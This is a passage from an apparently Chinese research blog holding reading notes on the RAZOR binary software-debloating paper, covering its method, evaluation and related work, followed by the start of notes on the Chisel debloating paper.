xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>z</mi><mi>C</mi><mi>o</mi><mi>d</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">zCode</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span></span></span></span></eq> 将未执行的分支加入到CFG中</li><li>如果启发式等级比 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>z</mi><mi>C</mi><mi>o</mi><mi>d</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">zCode</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span></span></span></span></eq> 高, <code>PathFinder</code> 将会首先得到从未选择分支出发的可选路径并且最终合并到已执行路径中.</li><li>随后迭代所有的可选路径,在迭代中根据启发式等级调用相应的验证函数</li><li>最后在13和14行,确定该路径是否需要被包括到CFG中</li></ol><h3 id="3.3-%E5%8E%BB%E8%86%A8%E8%83%80%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%90%88%E6%88%90-debloated-binary-synthesization" tabindex="-1">3.3 去膨胀二进制合成 Debloated Binary Synthesization</h3><ul><li><p>通过原始的膨胀二进制代码和扩展的CFG,<code>Generator</code>生成一个简化的二进制文件并包括所有的功能</p><ul><li><ol><li>其将根据CFG反汇编原本的二进制代码,并生成包含所有必要指令的伪汇编文件</li></ol></li><li><ol start="2"><li><code>Generator</code>修改伪汇编代码来创建合法的汇编代码. 这些修改包括 基本块的表示,具体化简介跳转,插入故障处理代码</li></ol></li><li><ol start="3"><li>将汇编代码编译成目标文件,其中包括所需指令的机器码</li></ol></li><li><ol start="4"><li><code>Generator</code>将机器码从目标文件中复制到原始二进制文件的新代码中</li></ol></li><li><ol start="5"><li><code>Generator</code>修改新代码段来修复原始代码和数据的引用</li></ol></li><li><ol start="6"><li>最后,<code>Generator</code>将原始代码段设置为不可执行以减小代码大小.(我们将原始代码段留在去膨胀程序中来支持可能的读取,如switch语句的跳转表[11],该设计将于后续讨论)</li></ol></li></ul></li><li><p>该部分需要底层知识,很费时间,如之后需要再细看</p></li></ul><h4 id="3.3.1-%E5%9F%BA%E6%9C%AC%E5%9D%97%E7%9A%84%E8%A1%A8%E7%A4%BA" tabindex="-1">3.3.1 基本块的表示</h4><h4 id="3.3.2-%E8%B7%B3%E8%BD%AC%E7%9A%84%E5%85%B7%E4%BD%93%E5%8C%96" tabindex="-1">3.3.2 跳转的具体化</h4><h4 id="3.3.3-%E6%95%85%E9%9A%9C%E5%A4%84%E7%90%86%E4%BB%A3%E7%A0%81" tabindex="-1">3.3.3 故障处理代码</h4><h2 id="4-%E5%AE%9E%E7%8E%B0" tabindex="-1">4 实现</h2><ul><li>我们使用1085行C代码、514行C++代码和4034行Python代码实现了RAZOR的原型,如下图所示<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(4)_13.png" alt></li><li>该原型只支持x86-64 ELF二进制文件</li></ul><h3 id="4.1-tracer-implementations" tabindex="-1">4.1 Tracer Implementations</h3><ul><li>我们为用户提供了三种不同的跟踪器,用户可以根据自己的需求选择最好的,甚至可以将多个工具的跟踪信息合并来获得更好的代码覆盖率.</li><li>在我们的评估中，我们使用基于软件的插桩技术来收集简单程序的完整跟踪信息，并使用基于硬件的方法来高效地获取大型程序的跟踪信息。</li></ul><h4 id="(1)-%E9%87%87%E7%94%A8%E8%BD%AF%E4%BB%B6%E6%8F%92%E8%A3%85%E8%BF%9B%E8%A1%8C%E8%B7%9F%E8%B8%AA" tabindex="-1">(1) 采用软件插装进行跟踪</h4><ul><li>使用动态插装工具Dynamorio [7]和Pin [25]来监测程序. 这两个工具都提供了在函数级别、基本块级别和指令级别的插装接口</li><li>我们通过三个插装步骤来收集控制流信息<ul><li><ol><li>在每个基本块的开始处记录起始地址</li></ol></li><li><ol start="2"><li>在每个条件分支指令,在指令和其两个目标之间插入两段代码来监听跳转的信息</li></ol></li><li><ol start="3"><li>在每个间接调用和跳转指令前,记录每次调用的具体目标</li></ol></li></ul></li><li>当基本块和条件分支指令运行后即可移除插装,保留间接跳转和调用指令的插装,以此减少不必要的开销</li></ul><h4 id="(2)-%E4%BD%BF%E7%94%A8%E7%A1%AC%E4%BB%B6%E7%89%B9%E6%80%A7%E8%BF%9B%E8%A1%8C%E8%BF%BD%E8%B8%AA" tabindex="-1">(2) 使用硬件特性进行追踪</h4><ul><li>考虑到软件插装的开销,我们提供了一个基于Intel处理器跟踪（Intel PT）的高效Tracer。</li><li>Intel PT以高度压缩的方式记录流信息的变化：TNT数据包描述了一个条件分支是否被执行；TIP数据包记录了间接分支的目标，例如间接调用和返回。</li><li>由于Intel PT直接将跟踪信息写入物理内存，而无需触及页表或内存缓存，因此它实现了最高效的跟踪。</li><li>可以使用不同平台上其它硬件功能实现更高效的Tracer,如Intel CPU上的分支跟踪存储（BTS）或在ARM CPU上的程序流跟踪（PTM）。</li></ul><h3 id="4.2-%E6%9B%B4%E6%96%B0elf%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86-update-elf-exception-handler" tabindex="-1">4.2 更新ELF异常处理 Update ELF Exception Handler</h3><p>emmm… 看得不是很懂呢,且跟汇编有关,略</p><h2 id="5-%E8%AF%84%E4%BC%B0" tabindex="-1">5 评估</h2><ul><li><p>从以下方面进行评估</p><ul><li>Code reduction:代码简化程度5.1</li><li>Functionality:<ul><li>功能有效性 5.2</li><li>路径寻找的效率 5.3</li></ul></li><li>安全性 5.4</li><li>性能开销 5.5</li><li>现实中的去膨胀 5.6</li></ul></li><li><p><strong>实验设置</strong></p><ul><li>在以下基准下进行评估<ul><li>29 SPEC CPU2006 基准:包括12个C,10个C++,10个Fortran程序</li><li>ChiselBench</li><li>两个现实程序:火狐浏览器和闭源PDF阅读器FoxitReader</li></ul></li><li>使用基于软件的追踪器<code>Dynamorio</code>和<code>Pin</code>来收集执行跟踪</li><li>对于FoxitReader和FireFox,我们使用基于硬件的追踪器<code>Intel PT</code>来收集执行跟踪,以此保证执行速度并避免异常行为</li><li>实验在64位ubuntu 16.04 系统上进行,使用Intel Core i7-6700K CPU, 32GB内存</li></ul></li></ul><h3 id="5.1-%E4%BB%A3%E7%A0%81%E7%AE%80%E5%8C%96%E7%A8%8B%E5%BA%A6" tabindex="-1">5.1 代码简化程度</h3><ul><li>因为RAZOR基于二进制,所以我们比较运行时的内存</li><li>下面对RAZOR和CHISEL进行对比:图a为在SPEC上,图b为在ChiselBench上<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(4)_7.png" alt><ul><li><ol><li>在SPEC中,RAZOR可以平均减少68.19%代码,CHISEL78.8%</li></ol></li><li><ol start="2"><li>在ChiselBench中,Chisel减少83.4%.</li></ol><ul><li>对于7个程序,chisel减少成都优于razor,但是在3个程序中,razor减少更多</li></ul></li></ul></li><li>需要注意的是Chisel更倾向于移除代码,只要满足输入即可</li></ul><h3 id="5.2-%E5%8A%9F%E8%83%BD%E6%9C%89%E6%95%88%E6%80%A7" tabindex="-1">5.2 功能有效性</h3><ul><li><p>使用chiselBenchmark,运行原始二进制文件,使用chisel后的二进制文件,使用razor后的二进制文件进行测试,以确定所需功能是否保留,结果如下图示<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(4)_8.png" alt="5.2"></p></li><li><p>RAZOR在使用保留更多代码的启发式时,最终都会通过功能验证. 而哈人的,Chisel自己只通过了3个,其主要有以下四个问题</p><ul><li><ol><li>错误的操作:因过拟合输入导致,如bzip2</li></ol></li><li><ol start="2"><li>无限循环:因为删除了循环的边界检查,如gzip</li></ol></li><li><ol start="3"><li>崩溃:删除了参数为空检查,如bzip2,date</li></ol></li><li><ol start="4"><li>遗漏输出:CHISEL删除了用于在stdout和stderr上打印输出的代码，导致结果丢失。如grep</li></ol></li></ul></li></ul><h3 id="5.3-%E8%B7%AF%E5%BE%84%E5%AF%BB%E6%89%BE%E7%9A%84%E6%95%88%E7%8E%87" tabindex="-1">5.3 路径寻找的效率</h3><ul><li><p>使用两组实验评估 <code>PathFinder</code>在寻找所需功能的相关代码时的有效性</p><ul><li><ol><li>使用从低到多不同启发式等级的RAZOR来去膨胀程序,找到对每个程序最小的启发式等级</li></ol></li><li><ol start="2"><li>使用N折交叉验证启发式方法的鲁棒性(在5.6中)</li></ol></li></ul></li><li><p>按照以下方法在ChiselBench上测试RAZOR</p><ul><li><ol><li>设计覆盖相同功能集的训练输入和测试输入</li></ol></li><li><ol start="2"><li>使用训练输入跟踪程序,并用不同等级的启发式进行去膨胀 none, zCode, zCall, zLib, zFunc</li></ol></li><li><ol start="3"><li>在测试输入上使用去膨胀后的程序,记录失败情况</li></ol></li></ul></li><li><p><code>PathFinder</code>配置见附录Table7,我们使用相同的选项构造训练集和测试集,但二者间具体的参数不同</p></li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(4)_9.png" alt></p><ul><li><p>上图展示了结果,可以明显看出,随着启发式等级的增加,失败的测试用例显著下降,而简化率的下降却不明显.</p></li><li><p>请注意，zCode启发式方法稍微增加了代码的减小幅度，因为它使得条件跳转的分支更多，从而减少了失败分支的插装。</p></li><li><p>四种启发式作用的例子:略,见论文</p></li><li><p>结论:<code>PathFinder</code>可以有效识别与训练输入线管的代码,并完备由训练输入出发的功能. 它强化了去膨胀二进制文件的同时保持了简化的效率</p></li></ul><h3 id="5.4-%E5%9C%A8%E5%AE%89%E5%85%A8%E6%96%B9%E9%9D%A2%E5%B8%A6%E6%9D%A5%E7%9A%84%E5%A5%BD%E5%A4%84" tabindex="-1">5.4 在安全方面带来的好处</h3><ul><li><p>通过统计减少的bug数来评估去膨胀带来的安全性</p></li><li><p>在ChiselBenchmark中统计其历史bug和如今bug</p><ul><li>对于历史bug,我们探究其补丁是否在去膨胀程序中</li><li>对于如今bug,我们探究其问题代码是否仍存在</li></ul></li><li><p>下图展示了评估结果,当前版本有13个bug,有10个在Chisel中被评估,3个bug存在在老版本<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(4)_10.png" alt></p><ul><li>图中bzip, date, gzip,mkdir, rm, and tar 的六个漏洞仍然存在，因为测试用例执行了相关的有漏洞代码</li><li>另外六个漏洞并非由二进制文件本身引起。例如，CVE-2011-4089是由bash脚本bzexe的竞态条件引起的，而不是由bzip2二进制文件引起的。因此，RAZOR不会禁用此类漏洞。</li></ul></li><li><p>Chisel与RAZOR相比</p><ul><li>Chisel比较激进,在移除了更多漏洞的同时也引入了旧的.</li><li>Razor比较保守,阻碍移除漏洞,但有助于避免新的漏洞</li></ul></li><li><p>同时测量了ROP（Return-Oriented Programming）gadgets的减少情况. 一旦攻击者能够改变控制流,可重用的ROP gadgets的数量将使得程序更易受控制流劫持的攻击</p><ul><li>RAZOR平均减少了 61.9%的ROP gadgets,而Chisel减少了 85.1%</li><li>结果在预期内,我们潜在的有意防止 forward-edge control-flow attacks,即攻击者通过破坏函数指针而不是返回地址来改变控制流</li><li>同时使用新技术可以进一步实现完整的控制流完整性</li></ul></li></ul><h3 id="5.5-%E6%80%A7%E8%83%BD%E5%BC%80%E9%94%80" tabindex="-1">5.5 性能开销</h3><ul><li><strong>时间</strong><ul><li>RAZOR<ul><li>ChiselBenchmark上平均1.78s</li><li>Firefox 8.51s</li><li>FoxitReader 50.42</li></ul></li><li>Chisel:在ChiselBenchmark上要11hours+</li></ul></li><li><strong>运行时开销</strong><ul><li>与SPEC基准测试进行比较,平均而言,RAZOR为去膨胀程序引入1.7%的运行时开销,表明其在现实世界不是是高效的.</li><li>间接调用是开销的主要来源,这里可以进一步优化</li></ul></li></ul><h3 id="5.6-%E5%9C%A8%E7%8E%B0%E5%AE%9E%E7%A8%8B%E5%BA%8F%E4%B8%8A%E7%9A%84%E5%8E%BB%E8%86%A8%E8%83%80" tabindex="-1">5.6 在现实程序上的去膨胀</h3><ul><li><p>对于Firefox浏览器，我们使用RAZOR加载了排名前50的Alexa网站[28]。我们随机选择了25个网站作为训练输入，并将另外25个网站作为测试输入。</p></li><li><p>对于Foxit Reader，我们使用RAZOR打开并滚动了包含表格、图形和JavaScript代码的55个不同的PDF文件。我们随机选择了其中的15个文件作为训练输入，并将另外40个文件作为测试输入</p></li></ul><h4 id="%E4%BB%A3%E7%A0%81%E7%BC%A9%E5%87%8F%E5%92%8C%E5%8A%9F%E8%83%BD%E6%80%A7" tabindex="-1">代码缩减和功能性</h4><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(4)_11.png" alt></p><p>如上图示,当启发式等级达到zLib时,可以通过所有的测试用例</p><h4 id="%E6%80%A7%E8%83%BD%E6%B6%88%E8%80%97" tabindex="-1">性能消耗</h4><ul><li>在几个基准测试上与运行了去膨胀的Firefox浏览器(启发式等级zLib)并发现RAZOR对Octane [33]、SunSpider [34]、Dromaeo-JS [30]和Dromaeo-DOM [29]基准测试引入了-2.1%、1.6%、0%和2.1%的开销</li><li>对于Foxit Reader未找到基准测试,但打开和滚动pdf未发现明显减速</li></ul><h4 id="%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF%3A%E6%AF%8F%E4%B8%AA%E7%BD%91%E7%AB%99%E7%9A%84%E6%B5%8F%E8%A7%88%E5%99%A8%E9%9A%94%E7%A6%BB" tabindex="-1">应用场景:每个网站的浏览器隔离</h4><ul><li>在传统的浏览器环境中，所有打开的标签页和窗口都在同一个进程和内存空间中运行。这意味着一个恶意网站可以通过注入脚本或其他攻击手段来访问和修改同一进程中的其他站点的内容。这可能导致用户数据泄露、会话劫持和其他安全问题。</li><li>每个网站的浏览器隔离,作为浏览器去除臃肿的一个应用，我们可以创建仅支持特定网站的最小化版本<ul><li>例如，银行可以为其客户提供一个只支持其网站所需功能的最小化浏览器，同时暴露最少的攻击面。</li></ul></li><li>们在三个受欢迎且安全敏感的网站集合上应用了RAZOR：银行网站、电子商务网站和社交媒体网站。可以看出可以带来一定的收益<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(4)_12.png" alt></li></ul><h4 id="%E5%90%AF%E5%8F%91%E5%BC%8F%E6%96%B9%E6%B3%95%E7%9A%84n%E6%8A%98%E4%BA%A4%E5%8F%89%E6%A3%80%E9%AA%8C" tabindex="-1">启发式方法的N折交叉检验</h4><ul><li>首先，我们将Alexa的前50个网站随机分成五组，每组10个网站。我们从中挑选了两组（共20个网站）进行训练，剩下的30个网站用于测试。我们进行了10次这样的评估. 结果略</li><li>其次，我们将Alexa的前50个网站随机分成10组，每组五个网站。我们从中随机挑选了五组（共25个网站）进行训练，剩下的25个网站用于测试。我们进行了10次这样的评估。结果略</li><li>结果表明，我们的启发式方法对于推断具有类似训练输入功能的未执行代码是有效的</li></ul><h2 id="6-%E8%AE%A8%E8%AE%BA" tabindex="-1">6 讨论</h2><h4 id="%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E7%9A%84%E8%B7%AF%E5%BE%84%E6%8E%A8%E6%96%AD-best-effort-path-inference" tabindex="-1">尽最大可能的路径推断 Best-effort path inference</h4><ul><li>将高等级的功能对应到低等级的代码是具有挑战性的,尤其是在代码未开源时</li><li>RAZOR采用基于控制流的启发式方法来推断更多的相关代码,但是这些方法并不完美,都是尽最大你眼里</li><li>目前,启发式的方法在二进制分析和重写中被广泛使用[53,52].通过执行跟踪,RAZOR能够减轻这些工作的局限性,例如找到间接调用目标.</li><li>评估显式,我们的基于控制流的启发式方法在实践中是有效的</li></ul><h4 id="cfi-and-deblaoting" tabindex="-1">CFI and deblaoting</h4><ul><li>控制流完整性Control-flow integrity (CFI)强制每个间接控制流转移（即间接调用/跳转和返回）都前往合法目标[1], 它防止了开发人员无法预料的恶意行为</li><li>而软件去膨胀需要根据用户的需求删除良性但不必要的代码<ul><li>例如,如果函数A被设计为间接调用i的合法目标，CFI将允许从i到A的转移。但是，如果用户不需要A中的功能，软件去膨胀将禁用转移并完全删除函数代码</li></ul></li><li>一方面,去膨胀实现了一种粗粒度的CFI，攻击者只能将控制流转移到剩余的代码。同时简化了一些CFI工作所需的分析，因为代码基础更小</li><li>另一方面,现有的CFI为实施去膨胀提供了基本平台。<ul><li>例如，RAZOR利用了在binCFI [53]中开发的几种二进制分析技术进行优化。</li></ul></li></ul><h4 id="%E5%9F%BA%E4%BA%8E%E5%BA%93%E7%9A%84%E5%8E%BB%E8%86%A8%E8%83%80" tabindex="-1">基于库的去膨胀</h4><ul><li>我们尝试使用RAZOR对每个程序的库进行去膨胀,又成功的也有失败的<ul><li>例如,在去膨胀libc.so库时,使用zFunc启发式方法最激进的保留代码,还是会触发不同的执行路径. 检查原因时发现其执行路径对环境变化非常敏感<ul><li><ol><li>其包含大量针对内存或字符串的高度优化代码,这戏代码会根据参数值选择最有效的实现方式,如strncmp有16种实现方式</li></ol></li><li><ol start="2"><li>其会根据进程状态进行不同的擦欧总,如每次内存分配,malloc会选择第一个可用块,输入的不同可能会导致malloc遍历完全不同的路径</li></ol></li></ul></li><li>为此我们计划开发针对库的启发式方法来应对环境敏感的运行<ul><li>例如,我们可以在函数级别而不是块级别上进行去膨胀</li></ul></li></ul></li><li>目前我们还将探索基于源码的方法,并尝试将其移植到二进制上</li></ul><h4 id="%E5%88%A0%E9%99%A4%E5%8E%9F%E5%A7%8B%E4%BB%A3%E7%A0%81" tabindex="-1">删除原始代码</h4><ul><li><p>RAZOR当前的设计是将原始代码 保留在去膨胀程序中,并将其权限更改为已读,以减少攻击面.</p></li><li><p>这种设计简化了对代码中潜在数据的处理,程序可能因为一些特殊目的来读取这些数据</p></li><li><p>为了进一步减小程序的大小,我们完全可以删除原始代码部分,具体操作如下</p><ul><li>在执行跟踪期间，我们将原始代码部分设置为仅执行[11]，以便任何从代码部分读取的操作都会触发异常并被追踪器记录；</li><li>我们执行向后的数据流分析，以确定每个记录的内存访问所使用的数据指针的来源；</li><li>在二进制合成过程中，我们将数据从原始代码部分重定位到新的数据部分，并更新新代码以访问新位置。</li></ul></li><li><p>通过这种方法,我们可以解决二进制重写过程中输入的重定位这一挑战性问题.</p><ul><li>实际上,我们进行了研究来了解这个问题的普遍性,我们发现在我们文章中测试用的程序,给定我们的测试用例,没有一个程序会从代码部分读取数据,此时只需要简单的删除原始代码即可,以减小文件大小和内存占用</li></ul></li></ul><h4 id="%E6%9C%AA%E6%9D%A5%E5%B7%A5%E4%BD%9C" tabindex="-1">未来工作</h4><ul><li>我们将开源RAZOR</li><li>我们计划扩展该平台以支持更多格式和架构的二进制文件，包括共享库、32位二进制文件、Windows PE程序、MacOS March-O程序和ARM二进制文件。</li><li>同时，我们将设计更多与安全性相关的启发式方法，使RAZOR能够支持各种真实世界的情况。</li></ul><h2 id="7-%E7%9B%B8%E5%85%B3%E5%B7%A5%E4%BD%9C" tabindex="-1">7 相关工作</h2><h3 id="library-debloating%3A%E5%9F%BA%E4%BA%8E%E5%BA%93%E7%9A%84%E5%8E%BB%E8%86%A8%E8%83%80" tabindex="-1">Library debloating:基于库的去膨胀</h3><ul><li><p>库旨在未不同的用户提供大量的功能支持,对库去膨胀可以对每个程序定制不同的代码基础,并显著减少代码</p></li><li><p>Mulliner :<em>CodeFreeze</em>:用于从Windows共享库中删除不必要的代码 [36]</p></li><li><p>Quach  :<em>piece-wise</em>:使用分块编译和加载进行去膨胀 [40]</p></li><li><p>Jiang  : 提出从Android应用程序,Java运行时环境和SDK中删除死代码的方法 [23,22]</p></li><li><p>我们的系统与上述方法有两个不同</p></li></ul><ol><li>之前的方法在每次过程开始都要进行二进制重写,而RAZOR通过静态二进制重写生成简化的二进制程序,一次重写永久使用</li><li>库去膨胀使用静态分析找到不用的代码,并且保守地保留了所有可能有用的代码;而我们地系统通过动态执行来跟踪和定位 执行的代码 或通过启发式找到代码,并移除其它地代码</li></ol><h3 id="delta-debugging-%E5%A2%9E%E9%87%8F%E8%B0%83%E8%AF%95%E6%B3%95" tabindex="-1">Delta debugging 增量调试法</h3><ul><li>DD被提出来 最小化触发错误的输出,例如<ul><li>Regehr,<em>C-Reduce</em>[42]:高效生成更小的测试用例</li><li>Sun,<em>Perses</em>[49]:使用形式化语法 很快地 生成更小却功能相同的程序</li><li>Heo,<em>Chisel</em>[15]:使用强化学习来加速DD过程</li></ul></li><li>然而,由DD产生的程序仅支持测试用例,尽管现实中对确定的功能有近乎无限的测试用例.</li><li>相反,RAZOR使用基于控制流的启发式方法,可以推断出更多的必要的相关代码来完备所需的功能</li></ul><h3 id="%E5%9F%BA%E4%BA%8E%E6%BA%90%E4%BB%A3%E7%A0%81%E7%9A%84%E5%8E%BB%E8%86%A8%E8%83%80" tabindex="-1">基于源代码的去膨胀</h3><ul><li>最近很多方法使用程序分析来简化代码<ul><li>Bu [8] : 提出了一种 <em>bloat-ware</em> 设计范式,该范式分析Java源代码来优化对象分配,避免运行时内存使用膨胀</li><li>Sharif [44] : 提出 <em>Trimmer</em>,将用户提供的被指传播到程序代码中,然后使用编译器优化来减小代码大小</li></ul></li><li>这些系统,以及[42,49,15] 依赖于对源代码的复杂分析,而这些分析不总是能用于部署的系统. 相反,RAZOR仅需要二进制程序,使其更适合实际部署</li></ul><h3 id="%E5%9F%BA%E4%BA%8E%E5%AE%B9%E5%99%A8%E7%9A%84%E5%8E%BB%E8%86%A8%E8%83%80" tabindex="-1">基于容器的去膨胀</h3><ul><li>容器变得越来越受欢迎,但其代码基础越来越膨胀</li><li>Guo[14] 提出了一个监视程序运行的方法,以识别必要的资源为被追踪的程序创建一个最小的容器</li><li>Rastogi[41] 开发了 <em>Cimplifier</em> , 使用动态分析来收集不同程序的资源使用,然后根据用户定义的策略将原始容器划分为一组较小的容器</li><li>RAZOR也适用于容器或其它系统的去膨胀,例如 Inter PT 支持操作系统的追踪,而这时RAZOR中使用的</li></ul><h3 id="%E5%9F%BA%E4%BA%8E%E7%A1%AC%E4%BB%B6%E7%9A%84%E5%8E%BB%E8%86%A8%E8%83%80" tabindex="-1">基于硬件的去膨胀</h3><ul><li>近来,硬件设备也是膨胀的,例如通用处理器被过度设计于应用于特定应用,如 嵌入式设备,可穿戴设备和互联网设备</li><li>Cherupalli[10] 提出了一个方法可以自动的从 通用处理器中 移除未使用的门,以生成为特定应用的定制处理器</li><li>目前,软件的膨胀和硬件的膨胀是分开进行的,一个有趣的方向是同时考虑硬件和软件来找到更多的去膨胀空间</li></ul><h2 id="8-%E7%BB%93%E8%AE%BA" tabindex="-1">8 结论</h2><ul><li>本文提出RAZOR,一个用于实际程序去膨胀的框架,它利用一组测试用例和基于控制流的启发式方法,来收集支持用户所需功能的必要代码</li><li>去膨胀的二进制程序有较小的攻击面,改进的安全性保证,鲁棒性的功能和高效的执行</li><li>我们的评估证明,RAZOR是一个实用的,可用于对现实程序简化的去膨胀方法</li></ul><h2 id="9-%E9%98%85%E8%AF%BB%E6%80%BB%E7%BB%93" tabindex="-1">9 阅读总结</h2><ol><li>本文<strong>问题驱动</strong>很好,对于老旧的程序,肯定会有一些过时的功能,这些功能的代码可能会带来安全性的问题,为此需要程序去膨胀</li><li><strong>相关代码</strong>的定义很好,但这应该是出现在基于输入测试用例的方法上,因为测试用例可能不能包括所有情况,所以有的相关代码没有被运行,如果轻易删除会引发问题.<ul><li>但是如果是非基于输入的方法呢</li></ul></li><li>需要坚实的底层基础,如了解汇编和反汇编等,这样才能更好理解本文方法</li><li>去膨胀需要在不同级别进行</li></ol><ul><li><p>本文因是在二进制上,所有可以从块级别出发构造CFG,然后进行去膨胀</p></li><li><p>对于基于源代码的,可以基于函数级别,基于库级别,而对于面向对象的语言,可以对于包级别等</p></li><li><p>问题</p><ul><li><ol><li>第四种启发式方法,即保留最大程度,怎么还要手工标注库的功能区分</li></ol></li><li><ol start="2"><li>方法基于二进制,可以无视软件是否开源直接使用,但相应的需要对应的底层代码知识,不方便开发人员进行二次改造(大概),并且这涉及用户的信任度,真敢用吗</li></ol></li></ul></li></ul><h2 id="10-%E5%A4%8D%E7%8E%B0" tabindex="-1">10 复现</h2><ul><li>使用docker进行复现</li></ul><h3 id="%E5%A4%8D%E7%8E%B0chiselbenchmark" tabindex="-1">复现ChiselBenchmark</h3><p>按照 <a href="https://github.com/cxreet/razor/wiki/Exercises">github网站指示</a> 即可</p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SoftwareEngineering </tag>
            
            <tag> SoftwareDebloating </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Software Debloating 论文阅读 (3)</title>
      <link href="/2024/01/15/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/SoftwareDebloating/Software%20Debloating%20%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB(3)/"/>
      <url>/2024/01/15/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/SoftwareDebloating/Software%20Debloating%20%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB(3)/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(3)_x.png" alt></p><h1 id="effective-program-debloating-via-reinforcement-learning-(chisel)" tabindex="-1">Effective Program Debloating via Reinforcement Learning (Chisel)</h1><p>2018 ACM SIGSAC Conference on Computer and Communications Security (CCS ’18)　CCFA会</p><p>Heo K, Lee W, Pashakhanloo P, et al. Effective program debloating via reinforcement learning[C],Proceedings of the 2018 ACM SIGSAC Conference on Computer and Communications Security. 2018: 380-394</p><h2 id="0-%E6%91%98%E8%A6%81" tabindex="-1">0 摘要</h2><ul><li>在软件工程中，代码重用和“一刀切”的方法是导致软件规模和复杂性显著增加的主要因素。由此产生的软件膨胀导致了性能下降和安全漏洞的增加。</li><li>我们提出了一个名为Chisel的系统，旨在帮助程序员有效地定制和去膨胀程序。<ul><li>Chisel接受一个待去膨胀的程序和一个对其所需功能的高级别规范作为输入</li><li>输出是一个根据规范正确减少的版本的程序</li><li>与其它方法相比,Chisel通过使用一种基于强化学习的新颖方法来加速搜索减少的程序并扩展到大型程序，从而显著提高了效果。</li></ul></li><li>我们对一组包含10个广泛使用的UNIX实用程序的13-90 KLOC(Kilo lines of code) C源代码套件进行了评估，结果表明Chisel能够成功去除所有不需要的功能并减少攻击面。</li></ul><h2 id="1-%E4%BB%8B%E7%BB%8D" tabindex="-1">1 介绍</h2><ul><li><p>软件膨胀导致性能下降并增加安全漏洞,此外常见库中的各种gadget使得攻击者可以在不向应用程序注入任何代码的情况下执行任意算法</p></li><li><p>此外软件经常包含一些被用户几乎没用过的功能,但没有给用户任何实际和有效的方法去除它们</p><ul><li>目前流行的做法是对现有程序重新进行一个轻量级的实现.例如针对嵌入式平台的轻量级实现:WebServer(Lighttpd),DataBase(SQLite),C/C++ libaries(EGLIBC,yClibc-bg),命令行实用程序(BusyBox,ToyBox). 但这种方法需要源代码开源且需要大量手动工作</li><li>在移动应用程序中,IOS APP引入乐系统瘦身,可以自动检测用户设备型号,仅下载特定设备所需的内容,但这需要开发者标记其软件来对应关系,这导致在IOS上该方法也不常用</li></ul></li><li><p>我们开发了一个实用的系统,使得程序员能够定制和简化程序</p><ul><li>该系统将一个程序,及其需要保留功能的相关高级规范作为输入</li><li>输出一个根据规范正确简化的程序</li></ul></li><li><p>我们认为简化后的程序有效需要以下五个关键点</p><ul><li><strong>Minimality</strong> 最小:系统是否尽可能地 根据期望地特点 修建了程序</li><li><strong>Efficiency</strong> 效率:系统是否高效地 找到了最小化地程序并且可以扩展到大规模的程序</li><li><strong>Robustness</strong> 鲁棒:系统是否避免了 引入新的异常和漏洞 在生成的程序中</li><li><strong>Naturalness</strong> 自然:系统是否生成了 可维护和可扩展 的代码</li><li><strong>Generality</strong> 通用:系统是否可以应用于 大量不同的 程序和特点吗</li></ul></li><li><p>如下图示,Chisel系统需要一个程序P和一个质量测试函数S,来检查获选程序是否满足或与需要的属性冲突,最后输出一个最简化的程序P’同时满足S<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(3)_1.png" alt></p></li><li><p>Chisel提供了一个 在生成程序最小性上的 正是保证,叫做 1-minimality,已经被证实在程序简化中有效</p><ul><li>调用质量测试函数可能很昂贵,例如其可能会参与候选程序的编译和 在程序套件运行</li><li>而1-minimality 保证 缩小算法在最坏情况下,调用质量测试函数的次数 为 程序大小的二次方</li><li>尽管 此保证 不能保证找到最优解,但也有次优性质,也很难扩展到大程序</li><li>而Chisel通过避免生成大量的 语义或语法上 无效的候选程序 来避免这个问题</li></ul></li><li><p>Chisel保证简化后的程序满足给定的属性期望,所以其具有鲁棒性.</p><ul><li>其避免会随换程序或破环其自然性的转换</li><li>最后,其将 程序和属性 都视为黑盒,使其适用于各种不同类型的程序和规范</li></ul></li><li><p>C-REDUCE 和 